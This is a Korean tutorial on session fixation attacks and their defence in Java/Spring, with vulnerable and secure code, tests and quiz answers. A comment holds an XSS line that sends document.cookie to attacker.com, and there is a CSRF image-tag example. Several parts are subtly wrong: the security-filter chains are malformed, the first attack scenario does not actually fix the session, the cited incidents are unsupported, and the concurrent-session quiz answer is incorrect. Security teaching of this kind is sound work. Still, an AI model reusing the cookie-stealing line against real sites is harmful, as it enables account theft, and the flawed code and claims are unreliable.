# 세션 고정 공격 (Session Fixation)
---

## 🎯 핵심 질문
공격자가 로그인 전에 미리 세션 ID를 설정하고, 피해자를 유도하여 같은 세션으로 로그인하게 만들면? 피해자가 인증된 세션을 공격자가 탈취하게 되는 취약점이 발생한다.

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

### Ruby on Rails의 세션 고정 사건 (2006)
Ruby on Rails의 초기 버전에서는 로그인 후에도 세션 ID가 바뀌지 않았다. 공격자는:
1. 로그인 전 세션 ID를 노트: `sessionid=abc123`
2. 피해자에게 링크 전송: `http://bank.com/?sessionid=abc123`
3. 피해자가 해당 링크로 로그인
4. 공격자가 `abc123`으로 접속하면 피해자 계정으로 인증됨

### PHP 세션 고정 취약점 (CVSS 9.8)
PHP 기반 전자상거래 사이트에서:
- 로그인 전: 사용자가 `PHPSESSID=attacker_value`로 접속
- 로그인 후: 같은 ID가 유지됨
- 공격자가 정보 유출, 부정 결제 수행

### 실제 피해 사례
- 온라인 뱅킹: 계좌 이체, 개인정보 변경
- 소셜 미디어: 계정 탈취, 개인정보 유출
- 이커머스: 결제 정보 조회, 부정 주문

## 😱 취약한 코드 (Before — 원리를 모를 때의 구현)

### 1. 로그인 후 세션 ID가 변경되지 않는 경우

```java
// ❌ 취약한 코드: 세션 고정 취약점
@RestController
public class VulnerableAuthController {
    
    @PostMapping("/login")
    public ResponseEntity<String> login(
            HttpServletRequest request,
            @RequestBody LoginRequest loginRequest) {
        
        // 세션 가져오기 (없으면 생성)
        HttpSession session = request.getSession(true);
        
        // ❌ 문제: 기존 세션 ID 유지
        // 로그인 전 공격자가 심은 세션 ID가 그대로 사용됨
        
        // 사용자 인증
        User user = authenticateUser(loginRequest.getUsername(), loginRequest.getPassword());
        
        if (user != null) {
            // ❌ 같은 세션에 사용자 정보 저장
            session.setAttribute("user", user);
            session.setAttribute("userId", user.getId());
            
            return ResponseEntity.ok("로그인 성공");
        } else {
            return ResponseEntity.status(401).body("로그인 실패");
        }
    }
}

// 공격 시나리오
// 1. 공격자: 브라우저에서 http://bank.com 방문
//    → 서버가 JSESSIONID=ABC123XYZ 쿠키 발급
//
// 2. 공격자: 피해자에게 다음 링크 전송
//    http://bank.com/login?redirect=http://attacker.com/phishing
//
// 3. 피해자: 링크 클릭, 로그인 페이지 방문
//    → 기존 쿠키 사용 (JSESSIONID=ABC123XYZ 계속 사용)
//
// 4. 피해자: 로그인 폼에서 자격증명 입력
//    → POST /login
//    → 같은 세션 ID(ABC123XYZ)에 피해자 정보 저장
//
// 5. 공격자: 피해자와 같은 세션 ID 사용하여 접속
//    → JSESSIONID=ABC123XYZ로 요청
//    → 서버: 세션에 저장된 피해자 정보 반환
//    → 공격자가 피해자 계정으로 인증됨!
```

### 2. 쿠키 속성이 설정되지 않는 경우

```java
// ❌ 취약한 코드: 쿠키 보안 속성 누락
@Configuration
public class VulnerableWebMvcConfig implements WebMvcConfigurer {
    
    @Bean
    public ServletContextInitializer servletContextInitializer() {
        return servletContext -> {
            SessionCookieConfig sessionCookieConfig = 
                servletContext.getSessionCookieConfig();
            
            // ❌ HttpOnly 미설정: JavaScript에서 쿠키 접근 가능 (XSS 취약)
            // ❌ Secure 미설정: HTTP에서도 쿠키 전송됨 (중간자 공격 취약)
            // ❌ SameSite 미설정: CSRF 공격에 취약
            
            // 따라서 공격자가 쉽게 세션 쿠키를 조작/탈취 가능
        };
    }
}

// 공격 예시
// 1. XSS 공격으로 쿠키 탈취:
//    <script>
//    fetch('http://attacker.com/steal?cookie=' + document.cookie);
//    </script>
//
// 2. 중간자 공격으로 쿠키 도청:
//    HTTP로 전송되므로 공격자가 네트워크 트래픽 스니핑
//
// 3. CSRF 공격으로 쿠키 전송:
//    <img src="http://bank.com/transfer?amount=1000&to=attacker">
//    → 자동으로 쿠키 포함되어 전송됨
```

### 3. 세션 무효화가 없는 경우

```java
// ❌ 취약한 코드: 로그아웃 시 세션 무효화 미실시
@RestController
public class VulnerableLogoutController {
    
    @PostMapping("/logout")
    public ResponseEntity<String> logout(HttpServletRequest request) {
        // ❌ 문제: 세션을 무효화하지 않음
        // 세션 데이터만 삭제하고 ID는 유효한 상태 유지
        
        HttpSession session = request.getSession(false);
        if (session != null) {
            session.removeAttribute("user");
            // ❌ session.invalidate() 호출 안함
        }
        
        return ResponseEntity.ok("로그아웃");
    }
}

// 공격 시나리오
// 1. 피해자가 공용 PC에서 로그인
// 2. 공격자가 세션 쿠키 얻음 (또는 세션 ID 추측)
// 3. 피해자가 로그아웃
//    → 세션의 user 속성만 제거
//    → 세션 ID는 여전히 유효
// 4. 공격자가 로그아웃 후에 세션 ID로 접속
//    → 세션이 존재하지만 user 속성이 없음
//    → 어라? user가 없네요. → 그냥 다시 로그인하도록 유도?
//    
// 더 심한 경우:
// 5. 피해자가 로그아웃 후 다른 계정으로 로그인
// 6. 공격자가 피해자의 이전 세션 ID로 접속
//    → 운이 좋으면 다른 계정의 세션이 그 ID에 재할당됨
```

## ✨ 방어 코드 (After — 공격 원리를 알고 설계한 구현)

### 1. 로그인 후 세션 ID 변경 (changeSessionId)

```java
// ✅ 안전한 코드: 로그인 후 세션 ID 변경
@RestController
public class SecureAuthController {
    
    @PostMapping("/login")
    public ResponseEntity<LoginResponse> login(
            HttpServletRequest request,
            HttpServletResponse response,
            @RequestBody LoginRequest loginRequest) {
        
        try {
            // 1. 사용자 인증
            User user = authenticateUser(
                loginRequest.getUsername(),
                loginRequest.getPassword()
            );
            
            if (user == null) {
                return ResponseEntity.status(401)
                    .body(new LoginResponse("로그인 실패", null));
            }
            
            // 2. ✅ 기존 세션 무효화
            HttpSession oldSession = request.getSession(false);
            if (oldSession != null) {
                oldSession.invalidate();
            }
            
            // 3. ✅ 새로운 세션 생성
            HttpSession newSession = request.getSession(true);
            
            // Spring Security를 사용하는 경우:
            // SecurityContextHolder의 세션 ID도 변경
            String newSessionId = newSession.getId();
            
            // 4. ✅ 새 세션에 사용자 정보 저장
            newSession.setAttribute("user", user);
            newSession.setAttribute("userId", user.getId());
            newSession.setAttribute("loginTime", System.currentTimeMillis());
            
            // 5. ✅ 세션 타임아웃 설정
            newSession.setMaxInactiveInterval(1800);  // 30분
            
            return ResponseEntity.ok(new LoginResponse(
                "로그인 성공",
                new LoginResponse.SessionInfo(newSessionId)
            ));
            
        } catch (Exception e) {
            return ResponseEntity.status(500)
                .body(new LoginResponse("로그인 처리 실패", null));
        }
    }
}

// Spring Security를 이용한 더 안전한 구현
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement()
                // ✅ 세션 고정 공격 방어: 로그인 후 세션 ID 변경
                .sessionFixation().migrateSession()  // ← 핵심 설정
                // 다른 옵션들:
                // .sessionFixation().newSession()  // 완전히 새로운 세션
                // .sessionFixation().none()        // 세션 고정 보호 안함 (금지)
                
                // ✅ 동시 세션 제한
                .maximumSessions(1)  // 사용자당 최대 1개 세션만 허용
                .maxSessionsPreventsLogin(false)  // false: 새 로그인 시 기존 세션 무효화
                .and()
                
                // ✅ 세션 타임아웃 설정
                .sessionFixation().migrateSession()
                .and()
            .and()
            .formLogin()
                .loginPage("/login")
                .loginProcessingUrl("/login")
                .defaultSuccessUrl("/home")
                .failureUrl("/login?error")
                .and()
            .logout()
                .logoutUrl("/logout")
                // ✅ 로그아웃 시 세션 무효화
                .invalidateHttpSession(true)
                // ✅ 쿠키 삭제
                .deleteCookies("JSESSIONID")
                .logoutSuccessUrl("/login?logout")
                .and()
            .csrf()
                .and()
            .build();
        
        return http.build();
    }
}

// 응답 클래스
class LoginResponse {
    public String message;
    public SessionInfo sessionInfo;
    
    public LoginResponse(String message, SessionInfo sessionInfo) {
        this.message = message;
        this.sessionInfo = sessionInfo;
    }
    
    static class SessionInfo {
        public String sessionId;
        
        public SessionInfo(String sessionId) {
            this.sessionId = sessionId;
        }
    }
}
```

### 2. 안전한 쿠키 설정

```java
// ✅ 안전한 코드: 쿠키 보안 속성 설정
@Configuration
public class SecurityCookieConfig {
    
    @Bean
    public ServletContextInitializer servletContextInitializer() {
        return servletContext -> {
            SessionCookieConfig sessionCookieConfig = 
                servletContext.getSessionCookieConfig();
            
            // ✅ 1. HttpOnly: JavaScript에서 쿠키 접근 차단
            sessionCookieConfig.setHttpOnly(true);
            
            // ✅ 2. Secure: HTTPS 연결에서만 쿠키 전송
            sessionCookieConfig.setSecure(true);
            
            // ✅ 3. SameSite: CSRF 공격 방지
            // Strict: 같은 사이트 요청에서만 쿠키 전송
            // Lax: 최상위 이동(링크 클릭 등)에서만 쿠키 전송
            sessionCookieConfig.setAttribute("SameSite", "Strict");
            
            // ✅ 4. Path: 특정 경로에서만 쿠키 사용
            sessionCookieConfig.setPath("/");
            
            // ✅ 5. Domain: 서브도메인에서 쿠키 공유 제한
            sessionCookieConfig.setDomain(".example.com");
        };
    }
}

// Spring Boot 설정 파일로도 가능
// application.properties
// server.servlet.session.cookie.http-only=true
// server.servlet.session.cookie.secure=true
// server.servlet.session.cookie.same-site=strict
// server.servlet.session.cookie.path=/
// server.servlet.session.timeout=30m

// Spring Security의 HttpSecurity로도 설정 가능
@Bean
public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
    http
        .sessionManagement()
            .sessionCreationPolicy(SessionCreationPolicy.IF_REQUIRED)
            .sessionFixation().migrateSession()
            .and()
        .csrf()
            .csrfTokenRepository(
                CookieCsrfTokenRepository.withHttpOnlyFalse()
            )
            .and()
        .build();
    
    return http.build();
}
```

### 3. 세션 저장소 강화 및 모니터링

```java
// ✅ 안전한 코드: 세션 저장소와 모니터링
@Service
public class SecureSessionService {
    
    @Autowired
    private SessionRepository sessionRepository;
    
    private static final Logger logger = LoggerFactory.getLogger(SecureSessionService.class);
    
    // 세션 정보 저장 (추가 메타데이터)
    public void saveSessionMetadata(String sessionId, User user, 
                                   HttpServletRequest request) {
        Map<String, Object> metadata = new HashMap<>();
        
        // ✅ 1. IP 주소 저장 (변경 감지용)
        String clientIp = getClientIp(request);
        metadata.put("ip_address", clientIp);
        
        // ✅ 2. User-Agent 저장 (브라우저 변경 감지용)
        String userAgent = request.getHeader("User-Agent");
        metadata.put("user_agent", userAgent);
        
        // ✅ 3. 로그인 시간
        metadata.put("login_time", System.currentTimeMillis());
        
        // ✅ 4. 마지막 활동 시간
        metadata.put("last_activity", System.currentTimeMillis());
        
        // Redis에 저장
        String key = "session_metadata:" + sessionId;
        // redisTemplate.opsForHash().putAll(key, metadata);
        // redisTemplate.expire(key, 30, TimeUnit.MINUTES);  // TTL 설정
    }
    
    // 의심스러운 세션 활동 감지
    public boolean isSessionCompromised(String sessionId, HttpServletRequest request) {
        String currentIp = getClientIp(request);
        String storedIp = getStoredIp(sessionId);
        
        // ✅ IP 변경 감지 (단, VPN 사용자는 고려)
        if (!currentIp.equals(storedIp)) {
            logger.warn("세션 IP 변경 감지: {} -> {}", storedIp, currentIp);
            return true;  // 의심스러운 활동
        }
        
        String currentUserAgent = request.getHeader("User-Agent");
        String storedUserAgent = getStoredUserAgent(sessionId);
        
        // ✅ User-Agent 변경 감지
        if (!currentUserAgent.equals(storedUserAgent)) {
            logger.warn("세션 User-Agent 변경 감지");
            return true;
        }
        
        return false;
    }
    
    // 세션 갱신 (활동 시간 업데이트)
    public void refreshSessionActivity(String sessionId) {
        String key = "session_metadata:" + sessionId;
        // redisTemplate.opsForHash().put(key, "last_activity", System.currentTimeMillis());
    }
    
    private String getClientIp(HttpServletRequest request) {
        String xForwarded = request.getHeader("X-Forwarded-For");
        if (xForwarded != null && !xForwarded.isEmpty()) {
            return xForwarded.split(",")[0];
        }
        return request.getRemoteAddr();
    }
    
    private String getStoredIp(String sessionId) {
        // Redis에서 조회
        return null;  // 구현 생략
    }
    
    private String getStoredUserAgent(String sessionId) {
        // Redis에서 조회
        return null;  // 구현 생략
    }
}

// 의심 활동 감지 필터
@Component
public class SessionSecurityFilter extends OncePerRequestFilter {
    
    @Autowired
    private SecureSessionService sessionService;
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain)
            throws ServletException, IOException {
        
        HttpSession session = request.getSession(false);
        if (session != null) {
            String sessionId = session.getId();
            
            // ✅ 세션 손상 감지
            if (sessionService.isSessionCompromised(sessionId, request)) {
                // 세션 무효화 및 재인증 요구
                session.invalidate();
                response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
                response.getWriter().write("세션 보안 경고: 다시 로그인해주세요");
                return;
            }
            
            // ✅ 마지막 활동 시간 업데이트
            sessionService.refreshSessionActivity(sessionId);
        }
        
        filterChain.doFilter(request, response);
    }
}
```

### 4. 동시 세션 관리

```java
// ✅ 안전한 코드: 동시 세션 제한
@Configuration
public class ConcurrentSessionConfig {
    
    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .sessionManagement()
                .sessionFixation().migrateSession()
                // ✅ 사용자당 최대 세션 수 제한
                .maximumSessions(1)
                // ✅ true: 새 로그인 거부, false: 기존 세션 무효화
                .maxSessionsPreventsLogin(false)
                .expiredUrl("/login?expired")
                .sessionRegistry(sessionRegistry())
                .and()
                .sessionFixation().migrateSession()
                .and()
            .build();
        
        return http.build();
    }
    
    @Bean
    public SessionRegistry sessionRegistry() {
        return new SessionRegistryImpl();
    }
}

// 동시 세션 모니터링
@RestController
public class SessionMonitoringController {
    
    @Autowired
    private SessionRegistry sessionRegistry;
    
    @GetMapping("/admin/sessions/{username}")
    public ResponseEntity<List<SessionInformation>> getActiveSessions(
            @PathVariable String username) {
        
        // ✅ 특정 사용자의 모든 활성 세션 조회
        List<SessionInformation> sessions = 
            sessionRegistry.getAllSessions(username, false);
        
        return ResponseEntity.ok(sessions);
    }
    
    @PostMapping("/admin/sessions/{sessionId}/invalidate")
    public ResponseEntity<String> invalidateSession(
            @PathVariable String sessionId) {
        
        // ✅ 특정 세션 강제 무효화 (관리자 권한)
        for (Object principal : sessionRegistry.getAllPrincipals()) {
            List<SessionInformation> sessions = 
                sessionRegistry.getAllSessions(principal.toString(), false);
            
            for (SessionInformation session : sessions) {
                if (session.getSessionId().equals(sessionId)) {
                    session.expireNow();
                    return ResponseEntity.ok("세션 무효화 완료");
                }
            }
        }
        
        return ResponseEntity.status(404).body("세션을 찾을 수 없습니다");
    }
}
```

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### 세션 고정 공격의 단계별 진행

```
Step 1: 세션 ID 설정
├─ 공격자가 브라우저에서 대상 사이트 방문
├─ 서버가 자동으로 JSESSIONID=ABC123 발급
└─ 공격자가 이 ID를 기억

Step 2: 피해자 유도
├─ 공격자가 다음 URL 생성
├─ http://bank.com/login?redirect=http://attacker.com/phishing
└─ 또는 단축 URL로 위장: http://short.url/bank (실제로는 bank.com)

Step 3: 피해자 로그인
├─ 피해자가 링크 클릭
├─ 쿠키 저장소에 JSESSIONID=ABC123이 없으면 생성 또는 유지
├─ 로그인 폼 제시
└─ 피해자가 자격증명 입력

Step 4: 서버 처리 (❌ 취약한 경우)
├─ 서버가 사용자 인증 수행
├─ ❌ 세션 ID를 변경하지 않음 (ABC123 그대로)
├─ 세션에 "user=victim" 저장
└─ 피해자에게 200 OK 응답

Step 5: 공격 성공
├─ 공격자가 자신의 브라우저에서 bank.com 방문
├─ JSESSIONID=ABC123 쿠키 자동 전송
├─ 서버: "이 세션의 user=victim" 확인
├─ 공격자가 피해자 계정으로 인증됨!
└─ 자금 이체, 정보 변경 등 악의적 행동
```

### 세션 고정 공격이 가능한 조건

```
┌─────────────────────────────────────────────┐
│ 세션 고정 공격 성공 조건                      │
├─────────────────────────────────────────────┤
│ 1. 로그인 전에 세션 ID가 발급됨              │
│ 2. 로그인 후에도 세션 ID가 변경되지 않음     │
│ 3. 세션 쿠키에 HttpOnly 속성이 없음          │
│    → 공격자가 JavaScript로 쿠키 설정 가능    │
│ 4. 세션 저장소에 IP 주소 등을 검증하지 않음 │
│ 5. 로그아웃 시 세션을 완전히 무효화하지 않음│
└─────────────────────────────────────────────┘

✅ 방어 조건
1. 로그인 후 반드시 세션 ID 변경 (migrateSession)
2. HttpOnly + Secure + SameSite 속성 설정
3. IP 주소 기반 추가 검증
4. 로그아웃 시 session.invalidate() 호출
5. 동시 세션 제한 (maximumSessions)
```

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실험 1: 세션 고정 공격 재현

```java
// 취약한 서버 시뮬레이션
@SpringBootTest
public class SessionFixationVulnerabilityTest {
    
    @Autowired
    private TestRestTemplate restTemplate;
    
    @Autowired
    private MockMvc mockMvc;
    
    @Test
    public void testSessionFixationVulnerability() throws Exception {
        // 1. 공격자가 사이트에 접속하여 세션 ID 획득
        MvcResult result1 = mockMvc.perform(get("/"))
            .andExpect(status().isOk())
            .andReturn();
        
        String attackerSessionId = extractSessionId(result1);
        System.out.println("공격자 세션 ID: " + attackerSessionId);
        
        // 2. 피해자가 공격자가 설정한 세션 ID로 로그인
        MvcResult result2 = mockMvc.perform(
            post("/login")
                .cookie(new Cookie("JSESSIONID", attackerSessionId))
                .param("username", "victim")
                .param("password", "password")
        )
            .andExpect(status().isOk())
            .andReturn();
        
        String victimSessionId = extractSessionId(result2);
        
        // ❌ 취약한 경우: 세션 ID가 변경되지 않음
        assertEquals(attackerSessionId, victimSessionId);
        
        // 3. 공격자가 같은 세션 ID로 피해자 계정 접근
        MvcResult result3 = mockMvc.perform(
            get("/api/user/profile")
                .cookie(new Cookie("JSESSIONID", attackerSessionId))
        )
            .andExpect(status().isOk())
            .andReturn();
        
        String response = result3.getResponse().getContentAsString();
        assertTrue(response.contains("victim"));  // ❌ 공격 성공!
    }
    
    @Test
    public void testSessionFixationDefense() throws Exception {
        // ✅ 안전한 경우: Spring Security sessionFixation().migrateSession() 사용
        
        // 1. 공격자가 세션 ID 획득
        MvcResult result1 = mockMvc.perform(get("/"))
            .andReturn();
        
        String attackerSessionId = extractSessionId(result1);
        
        // 2. 피해자가 로그인 (Spring Security 설정으로 세션 ID 변경)
        MvcResult result2 = mockMvc.perform(
            post("/login")
                .cookie(new Cookie("JSESSIONID", attackerSessionId))
                .param("username", "victim")
                .param("password", "password")
        )
            .andReturn();
        
        String victimSessionId = extractSessionId(result2);
        
        // ✅ 안전한 경우: 세션 ID가 변경됨
        assertNotEquals(attackerSessionId, victimSessionId);
        
        // 3. 공격자가 이전 세션 ID로 접근 시도
        MvcResult result3 = mockMvc.perform(
            get("/api/user/profile")
                .cookie(new Cookie("JSESSIONID", attackerSessionId))
        )
            .andExpect(status().isUnauthorized())  // ✅ 거절됨
            .andReturn();
    }
    
    private String extractSessionId(MvcResult result) {
        String cookieHeader = result.getResponse().getHeader("Set-Cookie");
        if (cookieHeader != null && cookieHeader.contains("JSESSIONID")) {
            return cookieHeader.split("JSESSIONID=")[1].split(";")[0];
        }
        return null;
    }
}
```

### 실험 2: 쿠키 속성 검증

```java
@SpringBootTest
public class CookieSecurityTest {
    
    @Test
    public void testCookieHttpOnlyAttribute() throws Exception {
        MvcResult result = mockMvc.perform(get("/"))
            .andReturn();
        
        String setCookieHeader = result.getResponse().getHeader("Set-Cookie");
        
        // ✅ HttpOnly 속성 확인
        assertTrue(
            setCookieHeader.contains("HttpOnly"),
            "쿠키에 HttpOnly 속성이 없습니다"
        );
    }
    
    @Test
    public void testCookieSecureAttribute() throws Exception {
        MvcResult result = mockMvc.perform(get("/"))
            .andReturn();
        
        String setCookieHeader = result.getResponse().getHeader("Set-Cookie");
        
        // ✅ Secure 속성 확인
        assertTrue(
            setCookieHeader.contains("Secure"),
            "쿠키에 Secure 속성이 없습니다"
        );
    }
    
    @Test
    public void testCookieSameSiteAttribute() throws Exception {
        MvcResult result = mockMvc.perform(get("/"))
            .andReturn();
        
        String setCookieHeader = result.getResponse().getHeader("Set-Cookie");
        
        // ✅ SameSite 속성 확인
        assertTrue(
            setCookieHeader.contains("SameSite=Strict"),
            "쿠키에 SameSite 속성이 없습니다"
        );
    }
}
```

### 실험 3: 동시 세션 제한

```java
@SpringBootTest
public class ConcurrentSessionTest {
    
    @Test
    public void testMaximumSessionsLimit() throws Exception {
        // 1. 사용자가 첫 번째 기기에서 로그인
        MvcResult result1 = mockMvc.perform(
            post("/login")
                .param("username", "user1")
                .param("password", "password")
        )
            .andExpect(status().isOk())
            .andReturn();
        
        String sessionId1 = extractSessionId(result1);
        
        // 2. 같은 사용자가 두 번째 기기에서 로그인
        MvcResult result2 = mockMvc.perform(
            post("/login")
                .param("username", "user1")
                .param("password", "password")
        )
            .andExpect(status().isOk())
            .andReturn();
        
        String sessionId2 = extractSessionId(result2);
        
        // 3. ✅ maxSessionsPreventsLogin=false인 경우:
        //    첫 번째 세션(sessionId1)이 무효화됨
        
        // 4. 첫 번째 세션으로 접근 시도
        MvcResult result3 = mockMvc.perform(
            get("/api/user/profile")
                .cookie(new Cookie("JSESSIONID", sessionId1))
        )
            .andExpect(status().isUnauthorized())  // ✅ 거절됨
            .andReturn();
        
        // 5. 두 번째 세션으로 접근은 성공
        MvcResult result4 = mockMvc.perform(
            get("/api/user/profile")
                .cookie(new Cookie("JSESSIONID", sessionId2))
        )
            .andExpect(status().isOk())
            .andReturn();
    }
}
```

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 항목 | 공격 성공 조건 | 방어 성공 조건 |
|------|--------------|--------------|
| **세션 ID 변경** | 로그인 후에도 ID 유지 | migrateSession() 또는 newSession() |
| **쿠키 HttpOnly** | HttpOnly 미설정 | `sessionCookieConfig.setHttpOnly(true)` |
| **쿠키 Secure** | HTTPS 미설정 | `sessionCookieConfig.setSecure(true)` |
| **SameSite** | SameSite 미설정 | `setAttribute("SameSite", "Strict")` |
| **세션 무효화** | 로그아웃 후에도 유효 | `invalidateHttpSession(true)` |
| **동시 세션** | 여러 세션 동시 사용 | `maximumSessions(1)` |
| **IP 검증** | IP 변경 무시 | SessionSecurityFilter로 IP 확인 |

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

### 1. 세션 ID 변경 vs 성능
- **보안**: 매번 로그인 시 새 세션 생성
- **성능**: 세션 메타데이터 마이그레이션 비용
- **트레이드오프**: 무시할 수 있는 수준의 성능 저하, 보안 이득이 큼

### 2. 동시 세션 제한 vs 사용성
- **보안**: maximumSessions(1) → 한 사용자 한 기기만 허용
- **사용성**: 직장, 집, 휴대폰에서 동시 접속 불가
- **트레이드오프**: 
  - maximumSessions(3)으로 완화
  - 또는 사용자가 기기를 관리하도록 허용

### 3. IP 기반 검증 vs 모바일 사용자
- **보안**: IP 변경 감지 → 의심 세션 무효화
- **사용성**: 모바일 사용자가 Wi-Fi ↔ 4G 전환 시 로그아웃됨
- **트레이드오프**:
  - IP 변경 시 재인증 요구 (완전 무효화 대신)
  - 또는 User-Agent + IP 조합으로 검증

### 4. 세션 타임아웃 vs 편의성
- **보안**: 짧은 타임아웃 (15분)
- **사용성**: 자주 재인증해야 함
- **트레이드오프**:
  - Remember-Me 토큰 사용
  - 또는 민감한 작업에만 재인증

## 📌 핵심 정리

1. **로그인 후 세션 ID 변경**
   ```java
   .sessionFixation().migrateSession()
   ```

2. **안전한 쿠키 속성**
   ```java
   setHttpOnly(true);  // XSS 방지
   setSecure(true);    // HTTPS 강제
   setAttribute("SameSite", "Strict");  // CSRF 방지
   ```

3. **로그아웃 시 세션 무효화**
   ```java
   .invalidateHttpSession(true)
   .deleteCookies("JSESSIONID")
   ```

4. **동시 세션 제한**
   ```java
   .maximumSessions(1)
   .maxSessionsPreventsLogin(false)  // 새 로그인 시 기존 세션 무효화
   ```

5. **IP 주소 기반 모니터링**
   ```java
   // 세션 생성 시 IP 저장
   // 매 요청 시 IP 비교, 변경 시 경고/무효화
   ```

## 🤔 생각해볼 문제 (+ 해설)

### 문제 1: migrateSession()과 newSession()의 차이는?
**해설:**
- `migrateSession()`: 기존 세션 속성을 새 세션으로 복사
  - 공격자의 세션이 있어도 로그인 후 새 ID로 변경되므로 공격 실패
  - 기존 속성 (예: 선택 언어)은 유지
  
- `newSession()`: 완전히 새로운 세션 생성, 기존 속성 폐기
  - 더 강한 보안 (이전 세션의 모든 데이터 제거)
  - 하지만 사용자 경험 저하 가능

- **권장**: `migrateSession()` (충분한 보안 + 사용성)

### 문제 2: HttpOnly 쿠키가 있는데도 왜 SameSite가 필요한가?
**해설:**
- HttpOnly: JavaScript에서 쿠키 접근 차단 (XSS 방지)
- SameSite: 다른 도메인에서 쿠키 자동 전송 차단 (CSRF 방지)
- 두 가지는 다른 공격을 방어함
  - XSS: 악성 JavaScript가 쿠키 탈취
  - CSRF: 악성 폼/이미지가 자동으로 쿠키 전송
- **따라서 둘 다 필요함**

### 문제 3: 동시 세션을 여러 개(maximumSessions(3)) 허용하면 세션 고정 공격에 취약한가?
**해설:**
- 아니다. 동시 세션 개수는 세션 고정 공격과 무관
- 세션 고정은 "로그인 후 세션 ID 변경"으로 방어
- 동시 세션은 "같은 사용자의 여러 기기 제어"일 뿐
- 예: maxSessionsPreventsLogin(false)이면
  - 기기 1에서 로그인 → 세션 1 생성
  - 기기 2에서 로그인 → 세션 2 생성 (세션 1 무효화)
  - 기기 3에서 로그인 → 세션 3 생성 (세션 2 무효화)
  - 각 기기마다 서로 다른 세션 ID이므로 고정 공격 불가능

---

<div align="center">

**[⬅️ 이전: JWT 안전한 구현](./02-jwt-secure-implementation.md)** | **[홈으로 🏠](../README.md)** | **[다음: CSRF 공격 ➡️](./04-csrf-attack.md)**

</div>
